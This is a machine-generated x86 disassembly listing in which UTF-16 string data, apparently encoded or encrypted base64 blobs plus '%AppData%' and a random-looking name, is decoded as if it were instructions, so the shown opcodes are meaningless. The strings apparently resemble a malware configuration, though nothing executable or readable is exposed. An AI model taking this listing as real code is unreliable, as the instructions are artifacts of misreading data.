  4096d9:	00 77 00             	add    %dh,0x0(%edi)
  4096dc:	75 00                	jne    0x4096de
  4096de:	38 00                	cmp    %al,(%eax)
  4096e0:	70 00                	jo     0x4096e2
  4096e2:	71 00                	jno    0x4096e4
  4096e4:	42                   	inc    %edx
  4096e5:	00 4a 00             	add    %cl,0x0(%edx)
  4096e8:	41                   	inc    %ecx
  4096e9:	00 49 00             	add    %cl,0x0(%ecx)
  4096ec:	33 00                	xor    (%eax),%eax
  4096ee:	31 00                	xor    %eax,(%eax)
  4096f0:	2f                   	das
  4096f1:	00 4f 00             	add    %cl,0x0(%edi)
  4096f4:	77 00                	ja     0x4096f6
  4096f6:	78 00                	js     0x4096f8
  4096f8:	4d                   	dec    %ebp
  4096f9:	00 6e 00             	add    %ch,0x0(%esi)
  4096fc:	62 00                	bound  %eax,(%eax)
  4096fe:	53                   	push   %ebx
  4096ff:	00 4f 00             	add    %cl,0x0(%edi)
  409702:	74 00                	je     0x409704
  409704:	4c                   	dec    %esp
  409705:	00 36                	add    %dh,(%esi)
  409707:	00 72 00             	add    %dh,0x0(%edx)
  40970a:	47                   	inc    %edi
  40970b:	00 67 00             	add    %ah,0x0(%edi)
  40970e:	32 00                	xor    (%eax),%al
  409710:	75 00                	jne    0x409712
  409712:	59                   	pop    %ecx
  409713:	00 2f                	add    %ch,(%edi)
  409715:	00 30                	add    %dh,(%eax)
  409717:	00 66 00             	add    %ah,0x0(%esi)
  40971a:	43                   	inc    %ebx
  40971b:	00 7a 00             	add    %bh,0x0(%edx)
  40971e:	6d                   	insl   (%dx),%es:(%edi)
  40971f:	00 49 00             	add    %cl,0x0(%ecx)
  409722:	44                   	inc    %esp
  409723:	00 46 00             	add    %al,0x0(%esi)
  409726:	71 00                	jno    0x409728
  409728:	34 00                	xor    $0x0,%al
  40972a:	63 00                	arpl   %eax,(%eax)
  40972c:	69 00 54 00 78 00    	imul   $0x780054,(%eax),%eax
  409732:	53                   	push   %ebx
  409733:	00 62 00             	add    %ah,0x0(%edx)
  409736:	68 00 36 00 70       	push   $0x70003600
  40973b:	00 43 00             	add    %al,0x0(%ebx)
  40973e:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  409742:	4b                   	dec    %ebx
  409743:	00 73 00             	add    %dh,0x0(%ebx)
  409746:	54                   	push   %esp
  409747:	00 5a 00             	add    %bl,0x0(%edx)
  40974a:	51                   	push   %ecx
  40974b:	00 59 00             	add    %bl,0x0(%ecx)
  40974e:	62 00                	bound  %eax,(%eax)
  409750:	73 00                	jae    0x409752
  409752:	54                   	push   %esp
  409753:	00 69 00             	add    %ch,0x0(%ecx)
  409756:	59                   	pop    %ecx
  409757:	00 6f 00             	add    %ch,0x0(%edi)
  40975a:	7a 00                	jp     0x40975c
  40975c:	52                   	push   %edx
  40975d:	00 71 00             	add    %dh,0x0(%ecx)
  409760:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  409764:	33 00                	xor    (%eax),%eax
  409766:	71 00                	jno    0x409768
  409768:	4d                   	dec    %ebp
  409769:	00 78 00             	add    %bh,0x0(%eax)
  40976c:	4f                   	dec    %edi
  40976d:	00 4f 00             	add    %cl,0x0(%edi)
  409770:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  409774:	6a 00                	push   $0x0
  409776:	71 00                	jno    0x409778
  409778:	6f                   	outsl  %ds:(%esi),(%dx)
  409779:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40977d:	00 50 00             	add    %dl,0x0(%eax)
  409780:	6f                   	outsl  %ds:(%esi),(%dx)
  409781:	00 66 00             	add    %ah,0x0(%esi)
  409784:	30 00                	xor    %al,(%eax)
  409786:	56                   	push   %esi
  409787:	00 58 00             	add    %bl,0x0(%eax)
  40978a:	67 00 33             	add    %dh,(%bp,%di)
  40978d:	00 38                	add    %bh,(%eax)
  40978f:	00 36                	add    %dh,(%esi)
  409791:	00 36                	add    %dh,(%esi)
  409793:	00 69 00             	add    %ch,0x0(%ecx)
  409796:	42                   	inc    %edx
  409797:	00 37                	add    %dh,(%edi)
  409799:	00 67 00             	add    %ah,0x0(%edi)
  40979c:	65 00 6c 00 59       	add    %ch,%gs:0x59(%eax,%eax,1)
  4097a1:	00 53 00             	add    %dl,0x0(%ebx)
  4097a4:	68 00 5a 00 79       	push   $0x79005a00
  4097a9:	00 77 00             	add    %dh,0x0(%edi)
  4097ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ad:	00 48 00             	add    %cl,0x0(%eax)
  4097b0:	5a                   	pop    %edx
  4097b1:	00 34 00             	add    %dh,(%eax,%eax,1)
  4097b4:	38 00                	cmp    %al,(%eax)
  4097b6:	55                   	push   %ebp
  4097b7:	00 6d 00             	add    %ch,0x0(%ebp)
  4097ba:	7a 00                	jp     0x4097bc
  4097bc:	59                   	pop    %ecx
  4097bd:	00 72 00             	add    %dh,0x0(%edx)
  4097c0:	6b 00 53             	imul   $0x53,(%eax),%eax
  4097c3:	00 6b 00             	add    %ch,0x0(%ebx)
  4097c6:	78 00                	js     0x4097c8
  4097c8:	41                   	inc    %ecx
  4097c9:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  4097cd:	00 4a 00             	add    %cl,0x0(%edx)
  4097d0:	70 00                	jo     0x4097d2
  4097d2:	39 00                	cmp    %eax,(%eax)
  4097d4:	6c                   	insb   (%dx),%es:(%edi)
  4097d5:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  4097d9:	00 31                	add    %dh,(%ecx)
  4097db:	00 73 00             	add    %dh,0x0(%ebx)
  4097de:	54                   	push   %esp
  4097df:	00 4f 00             	add    %cl,0x0(%edi)
  4097e2:	55                   	push   %ebp
  4097e3:	00 6e 00             	add    %ch,0x0(%esi)
  4097e6:	52                   	push   %edx
  4097e7:	00 49 00             	add    %cl,0x0(%ecx)
  4097ea:	4a                   	dec    %edx
  4097eb:	00 70 00             	add    %dh,0x0(%eax)
  4097ee:	32 00                	xor    (%eax),%al
  4097f0:	68 00 4d 00 66       	push   $0x66004d00
  4097f5:	00 41 00             	add    %al,0x0(%ecx)
  4097f8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  4097fd:	80 b1 57 00 72 00 6b 	xorb   $0x6b,0x720057(%ecx)
  409804:	00 52 00             	add    %dl,0x0(%edx)
  409807:	6e                   	outsb  %ds:(%esi),(%dx)
  409808:	00 5a 00             	add    %bl,0x0(%edx)
  40980b:	4c                   	dec    %esp
  40980c:	00 5a 00             	add    %bl,0x0(%edx)
  40980f:	6a 00                	push   $0x0
  409811:	66 00 70 00          	data16 add %dh,0x0(%eax)
  409815:	59                   	pop    %ecx
  409816:	00 38                	add    %bh,(%eax)
  409818:	00 4a 00             	add    %cl,0x0(%edx)
  40981b:	33 00                	xor    (%eax),%eax
  40981d:	76 00                	jbe    0x40981f
  40981f:	74 00                	je     0x409821
  409821:	71 00                	jno    0x409823
  409823:	46                   	inc    %esi
  409824:	00 30                	add    %dh,(%eax)
  409826:	00 34 00             	add    %dh,(%eax,%eax,1)
  409829:	51                   	push   %ecx
  40982a:	00 36                	add    %dh,(%esi)
  40982c:	00 31                	add    %dh,(%ecx)
  40982e:	00 67 00             	add    %ah,0x0(%edi)
  409831:	47                   	inc    %edi
  409832:	00 5a 00             	add    %bl,0x0(%edx)
  409835:	61                   	popa
  409836:	00 36                	add    %dh,(%esi)
  409838:	00 78 00             	add    %bh,0x0(%eax)
  40983b:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40983f:	73 00                	jae    0x409841
  409841:	33 00                	xor    (%eax),%eax
  409843:	31 00                	xor    %eax,(%eax)
  409845:	4e                   	dec    %esi
  409846:	00 6a 00             	add    %ch,0x0(%edx)
  409849:	67 00 35             	add    %dh,(%di)
  40984c:	00 30                	add    %dh,(%eax)
  40984e:	00 71 00             	add    %dh,0x0(%ecx)
  409851:	68 00 4d 00 63       	push   $0x63004d00
  409856:	00 57 00             	add    %dl,0x0(%edi)
  409859:	42                   	inc    %edx
  40985a:	00 4e 00             	add    %cl,0x0(%esi)
  40985d:	4d                   	dec    %ebp
  40985e:	00 36                	add    %dh,(%esi)
  409860:	00 47 00             	add    %al,0x0(%edi)
  409863:	4e                   	dec    %esi
  409864:	00 55 00             	add    %dl,0x0(%ebp)
  409867:	71 00                	jno    0x409869
  409869:	30 00                	xor    %al,(%eax)
  40986b:	68 00 42 00 47       	push   $0x47004200
  409870:	00 31                	add    %dh,(%ecx)
  409872:	00 31                	add    %dh,(%ecx)
  409874:	00 68 00             	add    %ch,0x0(%eax)
  409877:	38 00                	cmp    %al,(%eax)
  409879:	2b 00                	sub    (%eax),%eax
  40987b:	49                   	dec    %ecx
  40987c:	00 6e 00             	add    %ch,0x0(%esi)
  40987f:	37                   	aaa
  409880:	00 79 00             	add    %bh,0x0(%ecx)
  409883:	6d                   	insl   (%dx),%es:(%edi)
  409884:	00 2f                	add    %ch,(%edi)
  409886:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40988a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40988d:	2f                   	das
  40988e:	00 31                	add    %dh,(%ecx)
  409890:	00 4b 00             	add    %cl,0x0(%ebx)
  409893:	45                   	inc    %ebp
  409894:	00 67 00             	add    %ah,0x0(%edi)
  409897:	30 00                	xor    %al,(%eax)
  409899:	31 00                	xor    %eax,(%eax)
  40989b:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40989f:	2b 00                	sub    (%eax),%eax
  4098a1:	4e                   	dec    %esi
  4098a2:	00 4d 00             	add    %cl,0x0(%ebp)
  4098a5:	78 00                	js     0x4098a7
  4098a7:	51                   	push   %ecx
  4098a8:	00 77 00             	add    %dh,0x0(%edi)
  4098ab:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  4098b0:	80 b1 2f 00 4f 00 4f 	xorb   $0x4f,0x4f002f(%ecx)
  4098b7:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  4098bb:	00 6f 00             	add    %ch,0x0(%edi)
  4098be:	72 00                	jb     0x4098c0
  4098c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4098c1:	00 49 00             	add    %cl,0x0(%ecx)
  4098c4:	4b                   	dec    %ebx
  4098c5:	00 68 00             	add    %ch,0x0(%eax)
  4098c8:	47                   	inc    %edi
  4098c9:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
  4098cd:	00 57 00             	add    %dl,0x0(%edi)
  4098d0:	31 00                	xor    %eax,(%eax)
  4098d2:	6a 00                	push   $0x0
  4098d4:	5a                   	pop    %edx
  4098d5:	00 4d 00             	add    %cl,0x0(%ebp)
  4098d8:	58                   	pop    %eax
  4098d9:	00 39                	add    %bh,(%ecx)
  4098db:	00 69 00             	add    %ch,0x0(%ecx)
  4098de:	63 00                	arpl   %eax,(%eax)
  4098e0:	76 00                	jbe    0x4098e2
  4098e2:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  4098e6:	61                   	popa
  4098e7:	00 47 00             	add    %al,0x0(%edi)
  4098ea:	57                   	push   %edi
  4098eb:	00 4d 00             	add    %cl,0x0(%ebp)
  4098ee:	30 00                	xor    %al,(%eax)
  4098f0:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  4098f4:	73 00                	jae    0x4098f6
  4098f6:	59                   	pop    %ecx
  4098f7:	00 58 00             	add    %bl,0x0(%eax)
  4098fa:	78 00                	js     0x4098fc
  4098fc:	50                   	push   %eax
  4098fd:	00 53 00             	add    %dl,0x0(%ebx)
  409900:	56                   	push   %esi
  409901:	00 32                	add    %dh,(%edx)
  409903:	00 35 00 54 00 76    	add    %dh,0x76005400
  409909:	00 69 00             	add    %ch,0x0(%ecx)
  40990c:	35 00 6b 00 57       	xor    $0x57006b00,%eax
  409911:	00 62 00             	add    %ah,0x0(%edx)
  409914:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  409918:	62 00                	bound  %eax,(%eax)
  40991a:	76 00                	jbe    0x40991c
  40991c:	63 00                	arpl   %eax,(%eax)
  40991e:	6c                   	insb   (%dx),%es:(%edi)
  40991f:	00 78 00             	add    %bh,0x0(%eax)
  409922:	50                   	push   %eax
  409923:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  409927:	00 65 00             	add    %ah,0x0(%ebp)
  40992a:	31 00                	xor    %eax,(%eax)
  40992c:	4c                   	dec    %esp
  40992d:	00 6a 00             	add    %ch,0x0(%edx)
  409930:	7a 00                	jp     0x409932
  409932:	31 00                	xor    %eax,(%eax)
  409934:	49                   	dec    %ecx
  409935:	00 34 00             	add    %dh,(%eax,%eax,1)
  409938:	6b 00 55             	imul   $0x55,(%eax),%eax
  40993b:	00 71 00             	add    %dh,0x0(%ecx)
  40993e:	33 00                	xor    (%eax),%eax
  409940:	49                   	dec    %ecx
  409941:	00 69 00             	add    %ch,0x0(%ecx)
  409944:	69 00 76 00 72 00    	imul   $0x720076,(%eax),%eax
  40994a:	51                   	push   %ecx
  40994b:	00 62 00             	add    %ah,0x0(%edx)
  40994e:	42                   	inc    %edx
  40994f:	00 6d 00             	add    %ch,0x0(%ebp)
  409952:	6f                   	outsl  %ds:(%esi),(%dx)
  409953:	00 56 00             	add    %dl,0x0(%esi)
  409956:	77 00                	ja     0x409958
  409958:	7a 00                	jp     0x40995a
  40995a:	52                   	push   %edx
  40995b:	00 77 00             	add    %dh,0x0(%edi)
  40995e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409963:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409969:	00 70 00             	add    %dh,0x0(%eax)
  40996c:	44                   	inc    %esp
  40996d:	00 61 00             	add    %ah,0x0(%ecx)
  409970:	74 00                	je     0x409972
  409972:	61                   	popa
  409973:	00 25 00 00 01 00    	add    %ah,0x10000
  409979:	59                   	pop    %ecx
  40997a:	4e                   	dec    %esi
  40997b:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40997f:	00 45 00             	add    %al,0x0(%ebp)
  409982:	4e                   	dec    %esi
  409983:	00 58 00             	add    %bl,0x0(%eax)
  409986:	55                   	push   %ebp
  409987:	00 7a 00             	add    %bh,0x0(%edx)
  40998a:	4d                   	dec    %ebp
  40998b:	00 30                	add    %dh,(%eax)
  40998d:	00 70 00             	add    %dh,0x0(%eax)
  409990:	53                   	push   %ebx
  409991:	00 4e 00             	add    %cl,0x0(%esi)
  409994:	6a 00                	push   $0x0
  409996:	52                   	push   %edx
  409997:	00 55 00             	add    %dl,0x0(%ebp)
  40999a:	62 00                	bound  %eax,(%eax)
  40999c:	44                   	inc    %esp
  40999d:	00 51 00             	add    %dl,0x0(%ecx)
  4099a0:	78 00                	js     0x4099a2
  4099a2:	64 00 33             	add    %dh,%fs:(%ebx)
  4099a5:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  4099a9:	00 59 00             	add    %bl,0x0(%ecx)
  4099ac:	6c                   	insb   (%dx),%es:(%edi)
  4099ad:	00 52 00             	add    %dl,0x0(%edx)
  4099b0:	79 00                	jns    0x4099b2
  4099b2:	4e                   	dec    %esi
  4099b3:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  4099b7:	00 30                	add    %dh,(%eax)
  4099b9:	00 62 00             	add    %ah,0x0(%edx)
  4099bc:	57                   	push   %edi
  4099bd:	00 73 00             	add    %dh,0x0(%ebx)
  4099c0:	7a 00                	jp     0x4099c2
  4099c2:	57                   	push   %edi
  4099c3:	00 6e 00             	add    %ch,0x0(%esi)
  4099c6:	51                   	push   %ecx
  4099c7:	00 32                	add    %dh,(%edx)
  4099c9:	00 56 00             	add    %dl,0x0(%esi)
  4099cc:	6a 00                	push   $0x0
  4099ce:	41                   	inc    %ecx
  4099cf:	00 3d 00 00 19 78    	add    %bh,0x78190000
  4099d5:	00 67 00             	add    %ah,0x0(%edi)
  4099d8:	63 00                	arpl   %eax,(%eax)
  4099da:	6c                   	insb   (%dx),%es:(%edi)
  4099db:	00 67 00             	add    %ah,0x0(%edi)
  4099de:	64 00 6c 00 77       	add    %ch,%fs:0x77(%eax,%eax,1)
  4099e3:	00 72 00             	add    %dh,0x0(%edx)
  4099e6:	75 00                	jne    0x4099e8
  4099e8:	77 00                	ja     0x4099ea
  4099ea:	75 00                	jne    0x4099ec
  4099ec:	00 92 59 48 00 64    	add    %dl,0x64004859(%edx)
  4099f2:	00 4d 00             	add    %cl,0x0(%ebp)
  4099f5:	2f                   	das
  4099f6:	00 50 00             	add    %dl,0x0(%eax)
  4099f9:	46                   	inc    %esi
  4099fa:	00 7a 00             	add    %bh,0x0(%edx)
  4099fd:	6a 00                	push   $0x0
  4099ff:	33 00                	xor    (%eax),%eax
  409a01:	76 00                	jbe    0x409a03
  409a03:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  409a07:	45                   	inc    %ebp
  409a08:	00 76 00             	add    %dh,0x0(%esi)
  409a0b:	70 00                	jo     0x409a0d
  409a0d:	4a                   	dec    %edx
  409a0e:	00 33                	add    %dh,(%ebx)
  409a10:	00 51 00             	add    %dl,0x0(%ecx)
  409a13:	35 00 65 00 79       	xor    $0x79006500,%eax
  409a18:	00 61 00             	add    %ah,0x0(%ecx)
  409a1b:	75 00                	jne    0x409a1d
  409a1d:	33 00                	xor    (%eax),%eax
  409a1f:	43                   	inc    %ebx
  409a20:	00 68 00             	add    %ch,0x0(%eax)
  409a23:	41                   	inc    %ecx
  409a24:	00 59 00             	add    %bl,0x0(%ecx)
  409a27:	6a 00                	push   $0x0
  409a29:	6a 00                	push   $0x0
  409a2b:	78 00                	js     0x409a2d
  409a2d:	71 00                	jno    0x409a2f
  409a2f:	48                   	dec    %eax
  409a30:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  409a34:	00 71 00             	add    %dh,0x0(%ecx)
  409a37:	75 00                	jne    0x409a39
  409a39:	53                   	push   %ebx
  409a3a:	00 51 00             	add    %dl,0x0(%ecx)
  409a3d:	46                   	inc    %esi
  409a3e:	00 37                	add    %dh,(%edi)
  409a40:	00 35 00 69 00 71    	add    %dh,0x71006900
  409a46:	00 62 00             	add    %ah,0x0(%edx)
  409a49:	52                   	push   %edx
  409a4a:	00 45 00             	add    %al,0x0(%ebp)
  409a4d:	6f                   	outsl  %ds:(%esi),(%dx)
  409a4e:	00 36                	add    %dh,(%esi)
  409a50:	00 38                	add    %bh,(%eax)
  409a52:	00 67 00             	add    %ah,0x0(%edi)
  409a55:	57                   	push   %edi
  409a56:	00 36                	add    %dh,(%esi)
  409a58:	00 33                	add    %dh,(%ebx)
  409a5a:	00 63 00             	add    %ah,0x0(%ebx)
  409a5d:	6d                   	insl   (%dx),%es:(%edi)
  409a5e:	00 42 00             	add    %al,0x0(%edx)
  409a61:	67 00 66 00          	add    %ah,0x0(%bp)
  409a65:	43                   	inc    %ebx
  409a66:	00 62 00             	add    %ah,0x0(%edx)
  409a69:	45                   	inc    %ebp
  409a6a:	00 4a 00             	add    %cl,0x0(%edx)
  409a6d:	4c                   	dec    %esp
  409a6e:	00 66 00             	add    %ah,0x0(%esi)
  409a71:	76 00                	jbe    0x409a73
  409a73:	35 00 4e 00 77       	xor    $0x77004e00,%eax
  409a78:	00 48 00             	add    %cl,0x0(%eax)
  409a7b:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  409a7f:	32 00                	xor    (%eax),%al
  409a81:	71 00                	jno    0x409a83
  409a83:	58                   	pop    %eax
  409a84:	00 37                	add    %dh,(%edi)
  409a86:	00 30                	add    %dh,(%eax)
  409a88:	00 72 00             	add    %dh,0x0(%edx)
  409a8b:	6a 00                	push   $0x0
  409a8d:	43                   	inc    %ebx
  409a8e:	00 62 00             	add    %ah,0x0(%edx)
  409a91:	71 00                	jno    0x409a93
  409a93:	78 00                	js     0x409a95
  409a95:	4f                   	dec    %edi
  409a96:	00 6f 00             	add    %ch,0x0(%edi)
  409a99:	39 00                	cmp    %eax,(%eax)
  409a9b:	79 00                	jns    0x409a9d
  409a9d:	44                   	inc    %esp
  409a9e:	00 36                	add    %dh,(%esi)
  409aa0:	00 4a 00             	add    %cl,0x0(%edx)
  409aa3:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  409aa7:	57                   	push   %edi
  409aa8:	00 6e 00             	add    %ch,0x0(%esi)
  409aab:	75 00                	jne    0x409aad
  409aad:	69 00 53 00 39 00    	imul   $0x390053,(%eax),%eax
  409ab3:	30 00                	xor    %al,(%eax)
  409ab5:	39 00                	cmp    %eax,(%eax)
  409ab7:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab8:	00 37                	add    %dh,(%edi)
  409aba:	00 4b 00             	add    %cl,0x0(%ebx)
  409abd:	4b                   	dec    %ebx
  409abe:	00 71 00             	add    %dh,0x0(%ecx)
  409ac1:	74 00                	je     0x409ac3
  409ac3:	79 00                	jns    0x409ac5
  409ac5:	6c                   	insb   (%dx),%es:(%edi)
  409ac6:	00 6a 00             	add    %ch,0x0(%edx)
  409ac9:	31 00                	xor    %eax,(%eax)
  409acb:	6f                   	outsl  %ds:(%esi),(%dx)
  409acc:	00 47 00             	add    %al,0x0(%edi)
  409acf:	53                   	push   %ebx
  409ad0:	00 2f                	add    %ch,(%edi)
  409ad2:	00 52 00             	add    %dl,0x0(%edx)
  409ad5:	45                   	inc    %ebp
  409ad6:	00 72 00             	add    %dh,0x0(%edx)
  409ad9:	58                   	pop    %eax
  409ada:	00 55 00             	add    %dl,0x0(%ebp)
  409add:	6a 00                	push   $0x0
  409adf:	4f                   	dec    %edi
  409ae0:	00 75 00             	add    %dh,0x0(%ebp)
  409ae3:	41                   	inc    %ecx
  409ae4:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  409ae8:	00 48 00             	add    %cl,0x0(%eax)
  409aeb:	54                   	push   %esp
  409aec:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  409af0:	00 79 00             	add    %bh,0x0(%ecx)
  409af3:	64 00 54 00 37       	add    %dl,%fs:0x37(%eax,%eax,1)
  409af8:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  409afc:	00 41 00             	add    %al,0x0(%ecx)
  409aff:	4f                   	dec    %edi
  409b00:	00 50 00             	add    %dl,0x0(%eax)
  409b03:	62 00                	bound  %eax,(%eax)
  409b05:	30 00                	xor    %al,(%eax)
  409b07:	63 00                	arpl   %eax,(%eax)
  409b09:	43                   	inc    %ebx
  409b0a:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  409b0e:	00 4a 00             	add    %cl,0x0(%edx)
  409b11:	45                   	inc    %ebp
  409b12:	00 42 00             	add    %al,0x0(%edx)
  409b15:	65 00 32             	add    %dh,%gs:(%edx)
  409b18:	00 65 00             	add    %ah,0x0(%ebp)
  409b1b:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  409b1f:	30 00                	xor    %al,(%eax)
  409b21:	4f                   	dec    %edi
  409b22:	00 6b 00             	add    %ch,0x0(%ebx)
  409b25:	63 00                	arpl   %eax,(%eax)
  409b27:	4e                   	dec    %esi
  409b28:	00 45 00             	add    %al,0x0(%ebp)
  409b2b:	50                   	push   %eax
  409b2c:	00 36                	add    %dh,(%esi)
  409b2e:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b31:	41                   	inc    %ecx
  409b32:	00 4f 00             	add    %cl,0x0(%edi)
  409b35:	76 00                	jbe    0x409b37
  409b37:	6d                   	insl   (%dx),%es:(%edi)
  409b38:	00 43 00             	add    %al,0x0(%ebx)
  409b3b:	6b 00 32             	imul   $0x32,(%eax),%eax
  409b3e:	00 62 00             	add    %ah,0x0(%edx)
  409b41:	6f                   	outsl  %ds:(%esi),(%dx)
  409b42:	00 43 00             	add    %al,0x0(%ebx)
  409b45:	76 00                	jbe    0x409b47
  409b47:	4d                   	dec    %ebp
  409b48:	00 56 00             	add    %dl,0x0(%esi)
  409b4b:	53                   	push   %ebx
  409b4c:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  409b50:	00 50 00             	add    %dl,0x0(%eax)
  409b53:	4b                   	dec    %ebx
  409b54:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409b58:	00 45 00             	add    %al,0x0(%ebp)
  409b5b:	5a                   	pop    %edx
  409b5c:	00 2f                	add    %ch,(%edi)
  409b5e:	00 33                	add    %dh,(%ebx)
  409b60:	00 77 00             	add    %dh,0x0(%edi)
  409b63:	34 00                	xor    $0x0,%al
  409b65:	58                   	pop    %eax
  409b66:	00 55 00             	add    %dl,0x0(%ebp)
  409b69:	47                   	inc    %edi
  409b6a:	00 48 00             	add    %cl,0x0(%eax)
  409b6d:	48                   	dec    %eax
  409b6e:	00 71 00             	add    %dh,0x0(%ecx)
  409b71:	44                   	inc    %esp
  409b72:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  409b76:	00 6c 00 30          	add    %ch,0x30(%eax,%eax,1)
  409b7a:	00 2f                	add    %ch,(%edi)
  409b7c:	00 4b 00             	add    %cl,0x0(%ebx)
  409b7f:	53                   	push   %ebx
  409b80:	00 53 00             	add    %dl,0x0(%ebx)
  409b83:	47                   	inc    %edi
  409b84:	00 50 00             	add    %dl,0x0(%eax)
  409b87:	79 00                	jns    0x409b89
  409b89:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  409b8d:	52                   	push   %edx
  409b8e:	00 41 00             	add    %al,0x0(%ecx)
  409b91:	57                   	push   %edi
  409b92:	00 59 00             	add    %bl,0x0(%ecx)
  409b95:	34 00                	xor    $0x0,%al
  409b97:	48                   	dec    %eax
  409b98:	00 41 00             	add    %al,0x0(%ecx)
  409b9b:	49                   	dec    %ecx
  409b9c:	00 4d 00             	add    %cl,0x0(%ebp)
  409b9f:	68 00 4e 00 31       	push   $0x31004e00
  409ba4:	00 46 00             	add    %al,0x0(%esi)
  409ba7:	36 00 36             	add    %dh,%ss:(%esi)
  409baa:	00 48 00             	add    %cl,0x0(%eax)
  409bad:	78 00                	js     0x409baf
  409baf:	47                   	inc    %edi
  409bb0:	00 70 00             	add    %dh,0x0(%eax)
  409bb3:	4f                   	dec    %edi
  409bb4:	00 2b                	add    %ch,(%ebx)
  409bb6:	00 72 00             	add    %dh,0x0(%edx)
  409bb9:	75 00                	jne    0x409bbb
  409bbb:	77 00                	ja     0x409bbd
  409bbd:	49                   	dec    %ecx
  409bbe:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  409bc2:	00 69 00             	add    %ch,0x0(%ecx)
  409bc5:	6d                   	insl   (%dx),%es:(%edi)
  409bc6:	00 43 00             	add    %al,0x0(%ebx)
  409bc9:	6d                   	insl   (%dx),%es:(%edi)
  409bca:	00 48 00             	add    %cl,0x0(%eax)
  409bcd:	6d                   	insl   (%dx),%es:(%edi)
  409bce:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  409bd2:	00 79 00             	add    %bh,0x0(%ecx)
  409bd5:	57                   	push   %edi
  409bd6:	00 53 00             	add    %dl,0x0(%ebx)
  409bd9:	2b 00                	sub    (%eax),%eax
  409bdb:	45                   	inc    %ebp
  409bdc:	00 68 00             	add    %ch,0x0(%eax)
  409bdf:	71 00                	jno    0x409be1
  409be1:	65 00 37             	add    %dh,%gs:(%edi)
  409be4:	00 38                	add    %bh,(%eax)
  409be6:	00 6b 00             	add    %ch,0x0(%ebx)
  409be9:	55                   	push   %ebp
  409bea:	00 4b 00             	add    %cl,0x0(%ebx)
  409bed:	47                   	inc    %edi
  409bee:	00 76 00             	add    %dh,0x0(%esi)
  409bf1:	71 00                	jno    0x409bf3
  409bf3:	73 00                	jae    0x409bf5
  409bf5:	7a 00                	jp     0x409bf7
  409bf7:	69 00 6b 00 45 00    	imul   $0x45006b,(%eax),%eax
  409bfd:	5a                   	pop    %edx
  409bfe:	00 6b 00             	add    %ch,0x0(%ebx)
  409c01:	43                   	inc    %ebx
  409c02:	00 52 00             	add    %dl,0x0(%edx)
  409c05:	32 00                	xor    (%eax),%al
  409c07:	6e                   	outsb  %ds:(%esi),(%dx)
  409c08:	00 51 00             	add    %dl,0x0(%ecx)
  409c0b:	66 00 48 00          	data16 add %cl,0x0(%eax)
  409c0f:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  409c13:	4f                   	dec    %edi
  409c14:	00 4b 00             	add    %cl,0x0(%ebx)
  409c17:	41                   	inc    %ecx
  409c18:	00 56 00             	add    %dl,0x0(%esi)
  409c1b:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  409c1f:	45                   	inc    %ebp
  409c20:	00 49 00             	add    %cl,0x0(%ecx)
  409c23:	4a                   	dec    %edx
  409c24:	00 57 00             	add    %dl,0x0(%edi)
  409c27:	52                   	push   %edx
  409c28:	00 30                	add    %dh,(%eax)
  409c2a:	00 35 00 51 00 52    	add    %dh,0x52005100
  409c30:	00 32                	add    %dh,(%edx)
  409c32:	00 2b                	add    %ch,(%ebx)
  409c34:	00 4b 00             	add    %cl,0x0(%ebx)
  409c37:	4e                   	dec    %esi
  409c38:	00 58 00             	add    %bl,0x0(%eax)
  409c3b:	48                   	dec    %eax
  409c3c:	00 71 00             	add    %dh,0x0(%ecx)
  409c3f:	6a 00                	push   $0x0
  409c41:	75 00                	jne    0x409c43
  409c43:	59                   	pop    %ecx
  409c44:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  409c48:	00 45 00             	add    %al,0x0(%ebp)
  409c4b:	70 00                	jo     0x409c4d
  409c4d:	2b 00                	sub    (%eax),%eax
  409c4f:	53                   	push   %ebx
  409c50:	00 48 00             	add    %cl,0x0(%eax)
  409c53:	71 00                	jno    0x409c55
  409c55:	4e                   	dec    %esi
  409c56:	00 69 00             	add    %ch,0x0(%ecx)
  409c59:	2f                   	das
  409c5a:	00 4f 00             	add    %cl,0x0(%edi)
